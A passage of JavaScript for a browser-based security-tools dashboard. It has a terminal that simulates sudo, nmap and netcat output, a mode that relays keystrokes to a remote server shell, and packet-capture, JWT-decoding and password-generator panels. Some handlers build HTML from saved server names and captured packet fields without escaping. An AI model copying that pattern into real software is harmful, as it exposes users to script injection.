                            terminalInstance.write(`[sudo] password for root: `);
                            setTimeout(() => {
                                terminalInstance.writeln('');
                                const subCmd = args.slice(1).join(' ');
                                handleCommand(subCmd);
                            }, 500);
                            return;
                        } else {
                            terminalInstance.writeln('sudo: missing command');
                            prompt();
                        }
                        break;
                    case 'pkg':
                        if (args[1] === 'install') {
                            terminalInstance.writeln('Updating repository lists...');
                            terminalInstance.writeln(`Downloading ${args[2] || 'package'}...`);
                            terminalInstance.writeln('Installing...');
                            setTimeout(() => {
                                terminalInstance.writeln('\x1b[1;32mDone!\x1b[0m');
                                prompt();
                            }, 1000);
                            return;
                        } else {
                            terminalInstance.writeln('Usage: pkg install <package_name>');
                            prompt();
                        }
                        break;
                    case 'ping':
                        if (!args[1]) {
                            terminalInstance.writeln('Usage: ping <host>');
                            prompt();
                        } else {
                            const host = args[1];
                            terminalInstance.writeln(`PING ${host} (${host}) 56(84) bytes of data.`);
                            let count = 0;
                            const max = 4;
                            const interval = setInterval(() => {
                                count++;
                                const time = (Math.random() * 10 + 20).toFixed(1);
                                terminalInstance.writeln(`64 bytes from ${host}: icmp_seq=${count} ttl=57 time=${time} ms`);
                                if (count >= max) {
                                    clearInterval(interval);
                                    terminalInstance.writeln(`--- ${host} ping statistics ---`);
                                    terminalInstance.writeln(`${max} packets transmitted, ${max} received, 0% packet loss, time ${max * 1000}ms`);
                                    prompt();
                                }
                            }, 1000);
                            return;
                        }
                        break;
                    case 'nmap':
                        if (!args[1]) {
                            terminalInstance.writeln('Usage: nmap <target>');
                            prompt();
                        } else {
                            const target = args[1];
                            terminalInstance.writeln(`Starting Nmap 7.94 ( https://nmap.org ) at ${new Date().toISOString().split('T')[0]}`);
                            const latency = (Math.random() * 0.05 + 0.001).toFixed(4);
                            terminalInstance.writeln(`Nmap scan report for ${target}`);
                            terminalInstance.writeln(`Host is up (${latency}s latency).`);
                            const closedPorts = 990 + Math.floor(Math.random() * 10);
                            terminalInstance.writeln(`Not shown: ${closedPorts} closed tcp ports (reset)`);

                            setTimeout(() => {
                                terminalInstance.writeln(`PORT    STATE SERVICE`);
                                const commonPorts = [
                                    { port: 21, service: 'ftp' }, { port: 22, service: 'ssh' }, { port: 23, service: 'telnet' },
                                    { port: 25, service: 'smtp' }, { port: 53, service: 'domain' }, { port: 80, service: 'http' },
                                    { port: 110, service: 'pop3' }, { port: 143, service: 'imap' }, { port: 443, service: 'https' },
                                    { port: 3306, service: 'mysql' }, { port: 3389, service: 'ms-wbt-server' },
                                    { port: 5432, service: 'postgresql' }, { port: 8080, service: 'http-proxy' }
                                ];
                                const openPorts = [];
                                if (Math.random() > 0.5) openPorts.push({ port: 22, service: 'ssh' });
                                if (Math.random() > 0.2) { openPorts.push({ port: 80, service: 'http' }); openPorts.push({ port: 443, service: 'https' }); }
                                const extraCount = Math.floor(Math.random() * 4);
                                for (let i = 0; i < extraCount; i++) {
                                    const randomPort = commonPorts[Math.floor(Math.random() * commonPorts.length)];
                                    if (!openPorts.find(p => p.port === randomPort.port)) openPorts.push(randomPort);
                                }
                                openPorts.sort((a, b) => a.port - b.port);
                                openPorts.forEach(p => {
                                    terminalInstance.writeln(`${p.port}/tcp  \x1b[1;32mopen\x1b[0m  ${p.service}`);
                                });
                                const time = (Math.random() * 2 + 0.5).toFixed(2);
                                terminalInstance.writeln(`\nNmap done: 1 IP address (1 host up) scanned in ${time} seconds`);
                                prompt();
                            }, 1500);
                            return;
                        }
                        break;
                    case 'nc':
                    case 'netcat':
                        if (args.includes('-h') || args.includes('--help')) {
                            terminalInstance.writeln('OpenBSD netcat (Debian patch v1.218-4ubuntu1)');
                            terminalInstance.writeln('usage: nc [-46CDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl]');
                            terminalInstance.writeln('          [-m minttl] [-O length] [-P proxy_username] [-p source_port]');
                            terminalInstance.writeln('          [-q seconds] [-s source] [-T tos] [-V rtable] [-w timeout]');
                            terminalInstance.writeln('          [-X proxy_protocol] [-x proxy_address[:port]] [destination] [port]');
                            prompt();
                            return;
                        }
                        let isListening = args.includes('-l');
                        let portIndex = args.indexOf('-p');
                        let port = portIndex !== -1 ? args[portIndex + 1] : null;
                        let host = null;
                        if (!isListening) {
                            const cleanArgs = args.slice(1).filter(arg => !arg.startsWith('-'));
                            if (cleanArgs.length >= 2) {
                                host = cleanArgs[0];
                                port = cleanArgs[1];
                            }
                        }
                        if (isListening) {
                            if (!port) {
                                terminalInstance.writeln('nc: no port specified');
                                prompt();
                                return;
                            }
                            terminalInstance.writeln(`Listening on [0.0.0.0] (family 0, port ${port})`);
                            setTimeout(() => {
                                terminalInstance.writeln(`Connection from [192.168.1.55] ${Math.floor(Math.random() * 60000) + 1024} received!`);
                                terminalInstance.writeln('Interactive mode not fully supported in web sim. Press Ctrl+C to exit.');
                            }, 2000);
                        } else {
                            if (host && port) {
                                terminalInstance.writeln(`Connection to ${host} ${port} port [tcp/*] succeeded!`);
                                terminalInstance.writeln('Interactive mode not fully supported in web sim. Press Ctrl+C to exit.');
                            } else {
                                terminalInstance.writeln('usage: nc [options] [destination] [port]');
                                prompt();
                            }
                        }
                        break;
                    default:
                        terminalInstance.writeln(`bash: ${cmd}: command not found`);
                        prompt();
                }
            }
        }
        terminalInitialized = true;
    }

    function connectTerminalSocket(url) {
        if (socket) {
            socket.disconnect();
            socket = null;
        }

        const indicator = document.getElementById('terminal-connection-indicator');
        if (indicator) {
            indicator.className = 'connection-indicator connecting';
            indicator.title = `Connecting to ${url}...`;
        }

        terminalInstance.writeln(`\x1b[1;33mConnecting to ${url}...\x1b[0m`);
        terminalInstance.writeln(`\x1b[1;30mChecking network reachability...\x1b[0m`);

        // Pre-flight check
        const checkUrl = url.replace(/\/$/, '') + '/socket.io/socket.io.js';

        fetch(checkUrl, { method: 'HEAD', mode: 'no-cors' })
            .then(() => {
                // Reachable (or at least DNS resolved), try connecting
                connectSocket();
            })
            .catch(err => {
                terminalInstance.writeln(`\x1b[1;31mNETWORK ERROR: Cannot reach server at ${url}\x1b[0m`);
                terminalInstance.writeln(`\x1b[1;33mTroubleshooting:\x1b[0m`);
                terminalInstance.writeln(`1. Is the server running on the VM?`);
                terminalInstance.writeln(`2. Is port 3000 open in AWS Security Group?`);
                terminalInstance.writeln(`3. Did you update server.js on the VM to listen on 0.0.0.0?`);
                terminalInstance.writeln(`   (Run 'netstat -tulpn | grep 3000' on VM to check)`);

                if (indicator) {
                    indicator.className = 'connection-indicator';
                    indicator.title = `Network Unreachable`;
                }

                // Try connecting anyway in case fetch failed due to CORS but socket might work
                connectSocket();
            });

        function connectSocket() {
            if (socket) return; // Already connecting/connected

            socket = io(url, {
                transports: ['websocket', 'polling'],
                reconnectionAttempts: 3,
                timeout: 5000
            });

            socket.on('connect', () => {
                terminalInstance.writeln(`\x1b[1;32mConnected to ${url}\x1b[0m`);
                terminalInstance.writeln('');
                if (indicator) {
                    indicator.className = 'connection-indicator connected';
                    indicator.title = `Connected to ${url}`;
                }
                // Initial resize
                socket.emit('resize', { cols: terminalInstance.cols, rows: terminalInstance.rows });
            });

            socket.on('connect_error', (err) => {
                terminalInstance.writeln(`\x1b[1;31mConnection Error: ${err.message}\x1b[0m`);
                if (indicator) {
                    indicator.className = 'connection-indicator';
                    indicator.title = `Connection Failed: ${err.message}`;
                }
            });

            // Forward input to server
            // We need to clear previous listeners if any, but since we recreate socket, it's fine.
            // However, terminalInstance.onData adds a listener every time. 
            // We should ensure we don't add multiple listeners to terminalInstance.
            // For now, let's assume initializeTerminal only calls this once or we handle it.
            // Actually, initializeTerminal adds the listener. We need to make sure that listener uses the CURRENT socket.
            // The listener in initializeTerminal uses the global 'socket' variable, so it should be fine as long as we update that variable.

            // Receive output from server
            socket.on('output', data => {
                terminalInstance.write(data);
            });
        }
    }

    // Override navigateTo to handle terminal initialization
    const originalNavigateTo = navigateTo;
    navigateTo = function (route) {
        originalNavigateTo(route);

        // Initialize terminal when navigating to it
        if (route === 'terminal/shell') {
            if (!terminalInitialized) {
                const modeModal = document.getElementById('terminal-mode-modal');
                modeModal.classList.add('active');

                document.getElementById('btn-mode-simulated').onclick = () => {
                    modeModal.classList.remove('active');
                    setTimeout(() => initializeTerminal('simulated'), 100);
                };

                document.getElementById('btn-mode-localhost').onclick = () => {
                    modeModal.classList.remove('active');
                    setTimeout(() => initializeTerminal('localhost'), 100);
                };

                document.getElementById('btn-mode-real').onclick = () => {
                    modeModal.classList.remove('active');
                    setTimeout(() => initializeTerminal('real'), 100);
                };
            }
        }
    };
    let currentEmailId = null;
    const btnStartCapture = document.getElementById('btn-start-capture');
    const btnStopCapture = document.getElementById('btn-stop-capture');
    const interfaceSelect = document.getElementById('network-interface');
    const captureIndicator = document.getElementById('capture-indicator');
    const livePacketCount = document.getElementById('live-packet-count');
    const liveByteCount = document.getElementById('live-byte-count');
    const livePacketRate = document.getElementById('live-packet-rate');
    const packetTableBody = document.getElementById('packet-table-body');
    const captureStatusBar = document.getElementById('capture-status-bar');
    const captureStatusText = document.getElementById('capture-status-text');
    let packetCounter = 0;
    let lastPacketCount = 0;
    let rateInterval = null;

    async function fetchInterfaces() {
        try {
            const response = await fetch(getApiUrl('/api/pcap/interfaces'));
            const data = await response.json();

            interfaceSelect.innerHTML = '';
            if (data.interfaces && data.interfaces.length > 0) {
                data.interfaces.forEach(iface => {
                    const option = document.createElement('option');
                    option.value = iface.name;
                    option.textContent = `${iface.id}. ${iface.name} ${iface.description ? `(${iface.description})` : ''} ${iface.active ? '[ACTIVE]' : ''}`;
                    interfaceSelect.appendChild(option);
                });
            } else {
                const option = document.createElement('option');
                option.textContent = data.warning || 'No interfaces found';
                interfaceSelect.appendChild(option);
            }
        } catch (error) {
            console.error('Error fetching interfaces:', error);
            interfaceSelect.innerHTML = '<option>Error loading interfaces</option>';
        }
    }

    // Load interfaces when PCAP tool is opened
    document.querySelector('[data-route="network/pcap"]').addEventListener('click', () => {
        fetchInterfaces();
    });

    btnStartCapture.addEventListener('click', async () => {
        const iface = interfaceSelect.value;
        const filter = document.getElementById('capture-filter').value;

        // Show progress bar
        captureStatusBar.style.display = 'block';
        captureStatusText.textContent = 'INITIALIZING CAPTURE...';

        try {
            const response = await fetch(getApiUrl('/api/pcap/capture/start'), {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ interface: iface, filter })
            });
            const result = await response.json();

            if (result.success) {
                btnStartCapture.disabled = true;
                btnStopCapture.disabled = false;
                captureIndicator.classList.add('active');
                packetCounter = 0;
                lastPacketCount = 0;
                packetTableBody.innerHTML = ''; // Clear table
                document.getElementById('pcap-stats').style.display = 'block';

                captureStatusText.textContent = 'CAPTURE ACTIVE - ANALYZING PACKETS...';

                // Initialize socket if not already
                if (!socket) socket = io(getSocketUrl());

                // Calculate packet rate every second
                rateInterval = setInterval(() => {
                    const rate = packetCounter - lastPacketCount;
                    lastPacketCount = packetCounter;
                    livePacketRate.textContent = `${rate} pkt/s`;
                }, 1000);

                // Listen for packets
                socket.on('live-packet', (packet) => {
                    packetCounter++;
                    const row = document.createElement('tr');
                    row.innerHTML = `
                        <td>${packetCounter}</td>
                        <td>${new Date(packet.timestamp * 1000).toLocaleTimeString()}</td>
                        <td>${packet.src}</td>
                        <td>${packet.srcPort}</td>
                        <td>${packet.dst}</td>
                        <td>${packet.dstPort}</td>
                        <td><span class="protocol-badge ${packet.protocol.toLowerCase()}">${packet.protocol}</span></td>
                        <td>${packet.length}</td>
                        <td>${packet.flags ? `Flags: [${packet.flags}]` : ''}</td>
                    `;
                    packetTableBody.insertBefore(row, packetTableBody.firstChild);
                    if (packetTableBody.children.length > 100) {
                        packetTableBody.removeChild(packetTableBody.lastChild);
                    }
                });

                socket.on('capture-stats', (stats) => {
                    livePacketCount.textContent = stats.packets;
                    liveByteCount.textContent = formatBytes(stats.bytes);
                });
            } else {
                // Show error in status bar instead of alert
                captureStatusText.textContent = 'CAPTURE FAILED: ' + (result.error || 'Unknown error');
                captureStatusText.style.color = '#ff3333';
                setTimeout(() => {
                    captureStatusBar.style.display = 'none';
                    captureStatusText.style.color = '';
                }, 3000);
            }
        } catch (error) {
            // Show error in status bar instead of alert
            captureStatusText.textContent = 'CONNECTION ERROR - Check if server is running';
            captureStatusText.style.color = '#ff3333';
            setTimeout(() => {
                captureStatusBar.style.display = 'none';
                captureStatusText.style.color = '';
            }, 3000);
        }
    });

    btnStopCapture.addEventListener('click', async () => {
        captureStatusText.textContent = 'STOPPING CAPTURE...';

        try {
            const response = await fetch(getApiUrl('/api/pcap/capture/stop'), {
                method: 'POST'
            });
            const result = await response.json();

            if (result.success) {
                btnStartCapture.disabled = false;
                btnStopCapture.disabled = true;
                captureIndicator.classList.remove('active');
                captureStatusBar.style.display = 'none';

                // Clear rate interval
                if (rateInterval) {
                    clearInterval(rateInterval);
                    rateInterval = null;
                }

                if (socket) {
                    socket.off('live-packet');
                    socket.off('capture-stats');
                }
            }
        } catch (error) {
            // Silently handle error, just stop the UI
            btnStartCapture.disabled = false;
            btnStopCapture.disabled = true;
            captureIndicator.classList.remove('active');
            captureStatusBar.style.display = 'none';
            if (rateInterval) {
                clearInterval(rateInterval);
                rateInterval = null;
            }
        }
    });

    function formatBytes(bytes, decimals = 2) {
        if (!+bytes) return '0 Bytes';
        const k = 1024;
        const dm = decimals < 0 ? 0 : decimals;
        const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
        const i = Math.floor(Math.log(bytes) / Math.log(k));
        return `${parseFloat((bytes / Math.pow(k, i)).toFixed(dm))} ${sizes[i]}`;
    }

    // --- Username Onboarding ---
    const usernameModal = document.getElementById('username-modal');
    const usernameInput = document.getElementById('username-input');
    const btnSaveUsername = document.getElementById('btn-save-username');
    const userStatus = document.querySelector('.status-bar span:nth-child(2)');

    function updateUsernameDisplay() {
        const storedUsername = localStorage.getItem('cyber_username');
        if (storedUsername) {
            userStatus.textContent = `USER: ${storedUsername}`;
        }
    }

    // Check for username on load
    const storedUsername = localStorage.getItem('cyber_username');
    if (!storedUsername) {
        // Show modal
        usernameModal.classList.add('active');
        usernameInput.focus();
    } else {
        updateUsernameDisplay();
    }

    btnSaveUsername.addEventListener('click', () => {
        const username = usernameInput.value.trim().toUpperCase();
        if (username) {
            localStorage.setItem('cyber_username', username);
            updateUsernameDisplay();
            usernameModal.classList.remove('active');
        } else {
            usernameInput.style.borderColor = '#ff3333';
            setTimeout(() => {
                usernameInput.style.borderColor = 'var(--border-color)';
            }, 1000);
        }
    });

    // Allow Enter key to submit
    usernameInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
            btnSaveUsername.click();
        }
    });

    // --- Connection Settings Logic ---
    const remoteUrlInput = document.getElementById('remote-url');
    const btnSaveConnection = document.getElementById('btn-save-connection');
    const btnTestConnection = document.getElementById('btn-test-connection');
    const connectionStatus = document.getElementById('connection-status');

    // Load saved URL
    remoteUrlInput.value = getRemoteUrl();

    btnSaveConnection.addEventListener('click', () => {
        const url = normalizeServerUrl(remoteUrlInput.value);
        localStorage.setItem('cyber_remote_url', url);
        connectionStatus.classList.add('active');
        connectionStatus.innerHTML = `<p style="color: #00ff00;">SAVED AS: ${url || 'LOCAL'}</p>`;
        setTimeout(() => location.reload(), 1000);
    });

    btnTestConnection.addEventListener('click', async () => {
        const url = normalizeServerUrl(remoteUrlInput.value);
        if (!url) {
            connectionStatus.classList.add('active');
            connectionStatus.innerHTML = '<p style="color: #00ff00;">USING LOCAL SERVER (OK)</p>';
            return;
        }

        connectionStatus.classList.add('active');
        connectionStatus.innerHTML = `<p style="color: #ffff00;">TESTING ${url}...</p>`;
        try {
            // Try to fetch a simple endpoint (e.g., /) or check if we can reach it
            // Since we don't have a dedicated ping endpoint, we'll try fetching the home page or an API
            const testUrl = url.replace(/\/$/, '') + '/api/pcap/interfaces'; // Use an API endpoint
            const response = await fetch(testUrl);
            if (response.ok) {
                connectionStatus.innerHTML = '<p style="color: #00ff00;">CONNECTION SUCCESSFUL!</p>';
            } else {
                connectionStatus.innerHTML = `<p style="color: #ff3333;">CONNECTION FAILED: ${response.status}</p>`;
            }
        } catch (error) {
            connectionStatus.innerHTML = `<p style="color: #ff3333;">CONNECTION ERROR: ${error.message}</p>`;
        }
    });

    // --- Saved Servers Management ---
    const savedServersList = document.getElementById('saved-servers-list');
    const btnAddServer = document.getElementById('btn-add-server');
    const addServerForm = document.getElementById('add-server-form');
    const btnSaveServer = document.getElementById('btn-save-server');
    const btnCancelServer = document.getElementById('btn-cancel-server');
    const newServerName = document.getElementById('new-server-name');
    const newServerUrl = document.getElementById('new-server-url');

    // Helper functions for saved servers
    function getSavedServers() {
        const servers = localStorage.getItem('cyber_saved_servers');
        return servers ? JSON.parse(servers) : [];
    }

    function saveSavedServers(servers) {
        localStorage.setItem('cyber_saved_servers', JSON.stringify(servers));
    }

    function generateServerId() {
        return 'server_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    }

    function renderSavedServers() {
        const servers = getSavedServers();

        if (servers.length === 0) {
            savedServersList.innerHTML = `
                <div class="server-item empty-state">
                    No saved servers. Click "+ ADD SERVER" to add one.
                </div>
            `;
            return;
        }

        savedServersList.innerHTML = servers.map(server => `
            <div class="server-item" data-server-id="${server.id}">
                <div class="server-info">
                    <div class="server-name">${server.name}</div>
                    <div class="server-url">${server.url}</div>
                </div>
                <div class="server-actions">
                    <button class="cyber-btn btn-test-server" data-server-id="${server.id}">TEST</button>
                    <button class="cyber-btn warning btn-remove-server" data-server-id="${server.id}">REMOVE</button>
                </div>
            </div>
        `).join('');

        // Add event listeners to test and remove buttons
        document.querySelectorAll('.btn-test-server').forEach(btn => {
            btn.addEventListener('click', () => testServer(btn.dataset.serverId));
        });

        document.querySelectorAll('.btn-remove-server').forEach(btn => {
            btn.addEventListener('click', () => removeServer(btn.dataset.serverId));
        });
    }

    function testServer(serverId) {
        const servers = getSavedServers();
        const server = servers.find(s => s.id === serverId);
        if (!server) return;

        connectionStatus.classList.add('active');
        connectionStatus.innerHTML = `<p style="color: #ffff00;">TESTING ${server.name}...</p>`;

        fetch(server.url.replace(/\/$/, '') + '/api/pcap/interfaces')
            .then(response => {
                if (response.ok) {
                    connectionStatus.innerHTML = `<p style="color: #00ff00;">${server.name}: CONNECTION SUCCESSFUL!</p>`;
                } else {
                    connectionStatus.innerHTML = `<p style="color: #ff3333;">${server.name}: FAILED (${response.status})</p>`;
                }
            })
            .catch(error => {
                connectionStatus.innerHTML = `<p style="color: #ff3333;">${server.name}: ERROR - ${error.message}</p>`;
            });
    }

    function removeServer(serverId) {
        if (!confirm('Remove this server?')) return;

        let servers = getSavedServers();
        servers = servers.filter(s => s.id !== serverId);
        saveSavedServers(servers);
        renderSavedServers();
    }

    // Show/hide add server form
    btnAddServer.addEventListener('click', () => {
        addServerForm.style.display = 'block';
        btnAddServer.style.display = 'none';
        newServerName.focus();
    });

    btnCancelServer.addEventListener('click', () => {
        addServerForm.style.display = 'none';
        btnAddServer.style.display = 'block';
        newServerName.value = '';
        newServerUrl.value = '';
    });

    // Save new server
    btnSaveServer.addEventListener('click', () => {
        const name = newServerName.value.trim();
        const url = normalizeServerUrl(newServerUrl.value);

        if (!name || !url) {
            alert('Please enter both server name and URL/IP');
            return;
        }

        const servers = getSavedServers();
        servers.push({
            id: generateServerId(),
            name: name,
            url: url
        });

        saveSavedServers(servers);
        renderSavedServers();

        // Reset form
        newServerName.value = '';
        newServerUrl.value = '';
        addServerForm.style.display = 'none';
        btnAddServer.style.display = 'block';

        connectionStatus.classList.add('active');
        connectionStatus.innerHTML = `<p style="color: #00ff00;">SERVER "${name}" SAVED AS: ${url}</p>`;
        setTimeout(() => {
            connectionStatus.classList.remove('active');
        }, 3000);
    });

    // Initial render
    renderSavedServers();
    updateTerminalServerOptions();

    // --- Terminal Server Selector Logic ---
    const terminalServerSelect = document.getElementById('terminal-server-select');
    const terminalCustomUrlDiv = document.getElementById('terminal-custom-url');
    const terminalCustomUrlInput = document.getElementById('terminal-custom-url-input');
    const btnTerminalConnectCustom = document.getElementById('btn-terminal-connect-custom');

    function updateTerminalServerOptions() {
        if (!terminalServerSelect) return;

        const servers = getSavedServers();
        const savedOptions = servers.map(s => `<option value="${s.url}">${s.name}</option>`).join('');

        // Keep first 3 options (Local, Default, Custom) and append saved servers
        // We need to preserve the current selection if possible
        const currentVal = terminalServerSelect.value;

        terminalServerSelect.innerHTML = `
            <option value="local">Local (localhost:3000)</option>
            <option value="default">Default Remote</option>
            ${savedOptions}
            <option value="custom">Custom...</option>
        `;

        // Restore selection if it still exists, otherwise default to 'local' or 'default'
        if (currentVal && (currentVal === 'local' || currentVal === 'default' || currentVal === 'custom' || servers.some(s => s.url === currentVal))) {
            terminalServerSelect.value = currentVal;
        }
    }

    if (terminalServerSelect) {
        terminalServerSelect.addEventListener('change', () => {
            const value = terminalServerSelect.value;

            if (value === 'custom') {
                terminalCustomUrlDiv.style.display = 'block';
                terminalCustomUrlInput.focus();
            } else {
                terminalCustomUrlDiv.style.display = 'none';

                let url;
                if (value === 'local') {
                    url = 'http://localhost:3000';
                } else if (value === 'default') {
                    url = getRemoteUrl();
                } else {
                    url = value; // Saved server URL
                }

                // Save preference
                localStorage.setItem('cyber_terminal_server_url', url);

                // If terminal is active and in real-time mode, reconnect
                if (terminalInitialized && terminalMode === 'real') {
                    connectTerminalSocket(url);
                }
            }
        });

        btnTerminalConnectCustom.addEventListener('click', () => {
            const url = normalizeServerUrl(terminalCustomUrlInput.value);
            if (!url) {
                alert('Please enter a valid URL or IP');
                return;
            }

            // Save preference
            localStorage.setItem('cyber_terminal_server_url', url);

            // Connect
            if (terminalInitialized && terminalMode === 'real') {
                connectTerminalSocket(url);
            } else if (!terminalInitialized) {
                // If not initialized, just save it. It will be used when user enters real-time mode.
                alert(`Custom URL set to ${url}. Open Real-Time Terminal to connect.`);
            }
        });
    }

    // Hook into renderSavedServers to update dropdown
    const originalRenderSavedServers = renderSavedServers;
    renderSavedServers = function () {
        originalRenderSavedServers();
        updateTerminalServerOptions();
    };

    // --- JWT Decoder Tool ---
    const jwtInput = document.getElementById('jwt-input');
    const jwtResult = document.getElementById('jwt-result');
    const jwtHeader = document.getElementById('jwt-header');
    const jwtPayload = document.getElementById('jwt-payload');
    const jwtSignature = document.getElementById('jwt-signature');
    const jwtValidity = document.getElementById('jwt-validity');
    const jwtSecret = document.getElementById('jwt-secret');
    const jwtVerifyResult = document.getElementById('jwt-verify-result');

    function base64UrlDecode(str) {
        // Replace URL-safe characters and add padding
        let base64 = str.replace(/-/g, '+').replace(/_/g, '/');
        while (base64.length % 4) {
            base64 += '=';
        }
        try {
            return decodeURIComponent(atob(base64).split('').map(c => 
                '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2)
            ).join(''));
        } catch (e) {
            return atob(base64);
        }
    }

    function decodeJWT(token) {
        const parts = token.trim().split('.');
        if (parts.length !== 3) {
            throw new Error('Invalid JWT format - must have 3 parts');
        }

        const header = JSON.parse(base64UrlDecode(parts[0]));
        const payload = JSON.parse(base64UrlDecode(parts[1]));
        const signature = parts[2];

        return { header, payload, signature };
    }

    function formatExpiry(payload) {
        const now = Math.floor(Date.now() / 1000);
        let html = '';

        if (payload.exp) {
            const expDate = new Date(payload.exp * 1000);
            const isExpired = payload.exp < now;
            html += `<div class="${isExpired ? 'expired' : 'valid'}">
                EXPIRES: ${expDate.toLocaleString()} ${isExpired ? '(EXPIRED)' : '(VALID)'}
            </div>`;
        }

        if (payload.iat) {
            const iatDate = new Date(payload.iat * 1000);
            html += `<div>ISSUED AT: ${iatDate.toLocaleString()}</div>`;
        }

        if (payload.nbf) {
            const nbfDate = new Date(payload.nbf * 1000);
            const notYetValid = payload.nbf > now;
            html += `<div class="${notYetValid ? 'expired' : ''}">
                NOT BEFORE: ${nbfDate.toLocaleString()} ${notYetValid ? '(NOT YET VALID)' : ''}
            </div>`;
        }

        return html || '<div>NO EXPIRATION CLAIMS FOUND</div>';
    }

    if (document.getElementById('btn-jwt-decode')) {
        document.getElementById('btn-jwt-decode').addEventListener('click', () => {
            try {
                if (!jwtInput.value.trim()) {
                    alert('Please enter a JWT token');
                    return;
                }

                const { header, payload, signature } = decodeJWT(jwtInput.value);

                jwtHeader.textContent = JSON.stringify(header, null, 2);
                jwtPayload.textContent = JSON.stringify(payload, null, 2);
                jwtSignature.textContent = signature;
                jwtValidity.innerHTML = formatExpiry(payload);

                jwtResult.style.display = 'block';
                jwtVerifyResult.innerHTML = '';
            } catch (e) {
                alert('ERROR: ' + e.message);
                jwtResult.style.display = 'none';
            }
        });

        document.getElementById('btn-jwt-clear').addEventListener('click', () => {
            jwtInput.value = '';
            jwtResult.style.display = 'none';
            jwtVerifyResult.innerHTML = '';
            jwtSecret.value = '';
        });

        // Copy buttons for JWT sections
        document.querySelectorAll('[data-copy]').forEach(btn => {
            btn.addEventListener('click', () => {
                const targetId = btn.dataset.copy;
                const targetEl = document.getElementById(targetId);
                if (targetEl) {
                    navigator.clipboard.writeText(targetEl.textContent);
                    const originalText = btn.textContent;
                    btn.textContent = 'COPIED!';
                    setTimeout(() => btn.textContent = originalText, 1000);
                }
            });
        });

        // HS256 Signature verification
        document.getElementById('btn-jwt-verify').addEventListener('click', async () => {
            try {
                const token = jwtInput.value.trim();
                const secret = jwtSecret.value;

                if (!token || !secret) {
                    jwtVerifyResult.innerHTML = '<p style="color: #ff6600;">PLEASE ENTER BOTH TOKEN AND SECRET</p>';
                    return;
                }

                const parts = token.split('.');
                if (parts.length !== 3) {
                    jwtVerifyResult.innerHTML = '<p style="color: #ff0000;">INVALID JWT FORMAT</p>';
                    return;
                }

                const { header } = decodeJWT(token);
                if (header.alg !== 'HS256') {
                    jwtVerifyResult.innerHTML = `<p style="color: #ff6600;">ALGORITHM IS ${header.alg}, ONLY HS256 VERIFICATION SUPPORTED</p>`;
                    return;
                }

                // Create HMAC-SHA256 signature using Web Crypto API
                const encoder = new TextEncoder();
                const data = encoder.encode(parts[0] + '.' + parts[1]);
                const keyData = encoder.encode(secret);

                const key = await crypto.subtle.importKey(
                    'raw', keyData, { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']
                );

                const signatureBytes = await crypto.subtle.sign('HMAC', key, data);
                const computedSig = btoa(String.fromCharCode(...new Uint8Array(signatureBytes)))
                    .replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');

                if (computedSig === parts[2]) {
                    jwtVerifyResult.innerHTML = '<p style="color: #00ff00;">✓ SIGNATURE VALID</p>';
                } else {
                    jwtVerifyResult.innerHTML = '<p style="color: #ff0000;">✗ SIGNATURE INVALID</p>';
                }
            } catch (e) {
                jwtVerifyResult.innerHTML = `<p style="color: #ff0000;">ERROR: ${e.message}</p>`;
            }
        });
    }

    // --- Password Generator Tool ---
    const passwordLength = document.getElementById('password-length');
    const passwordLengthDisplay = document.getElementById('password-length-display');
    const passwordOutput = document.getElementById('password-output');
    const passwordStrength = document.getElementById('password-strength');

    if (passwordLength) {
        passwordLength.addEventListener('input', () => {
            passwordLengthDisplay.textContent = passwordLength.value;
        });

        function generateSecurePassword(length, options) {
            let charset = '';
            if (options.uppercase) charset += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
            if (options.lowercase) charset += 'abcdefghijklmnopqrstuvwxyz';
            if (options.numbers) charset += '0123456789';
            if (options.symbols) charset += '!@#$%^&*()_+-=[]{}|;:,.<>?';

            if (charset.length === 0) {
                return 'ERROR: SELECT AT LEAST ONE CHARACTER SET';
            }

            const array = new Uint32Array(length);
            crypto.getRandomValues(array);
            return Array.from(array, x => charset[x % charset.length]).join('');
        }

        function calculateStrength(password) {
            let score = 0;
            if (password.length >= 8) score++;
            if (password.length >= 12) score++;
            if (password.length >= 16) score++;
            if (/[a-z]/.test(password)) score++;
            if (/[A-Z]/.test(password)) score++;
            if (/[0-9]/.test(password)) score++;
            if (/[^a-zA-Z0-9]/.test(password)) score++;

            if (score <= 2) return { level: 'WEAK', color: '#ff0000' };
            if (score <= 4) return { level: 'MODERATE', color: '#ff6600' };
            if (score <= 5) return { level: 'STRONG', color: '#00ff00' };
            return { level: 'VERY STRONG', color: '#00ffff' };
        }

        document.getElementById('btn-generate-password').addEventListener('click', () => {
            const length = parseInt(passwordLength.value);
            const count = parseInt(document.getElementById('password-count').value);
            const options = {
                uppercase: document.getElementById('pw-uppercase').checked,
                lowercase: document.getElementById('pw-lowercase').checked,
                numbers: document.getElementById('pw-numbers').checked,
                symbols: document.getElementById('pw-symbols').checked
            };

            const passwords = [];
            for (let i = 0; i < count; i++) {
                passwords.push(generateSecurePassword(length, options));
            }
            passwordOutput.value = passwords.join('\n');

            // Show strength for first password
            if (passwords.length > 0 && !passwords[0].startsWith('ERROR')) {
                const strength = calculateStrength(passwords[0]);
                passwordStrength.innerHTML = `STRENGTH: <span style="color: ${strength.color};">${strength.level}</span>`;
            }
        });

        document.getElementById('btn-generate-uuid').addEventListener('click', () => {
            const count = parseInt(document.getElementById('password-count').value);
            const uuids = [];
            for (let i = 0; i < count; i++) {
                uuids.push(crypto.randomUUID());
            }
            passwordOutput.value = uuids.join('\n');
            passwordStrength.innerHTML = '';
        });

        document.getElementById('btn-generate-apikey').addEventListener('click', () => {
            const count = parseInt(document.getElementById('password-count').value);
            const keys = [];
            const charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            for (let i = 0; i < count; i++) {
                const array = new Uint32Array(32);
                crypto.getRandomValues(array);
                const key = Array.from(array, x => charset[x % charset.length]).join('');
                keys.push(key);
            }
            passwordOutput.value = keys.join('\n');
            passwordStrength.innerHTML = '';
        });

        document.getElementById('btn-copy-password').addEventListener('click', () => {
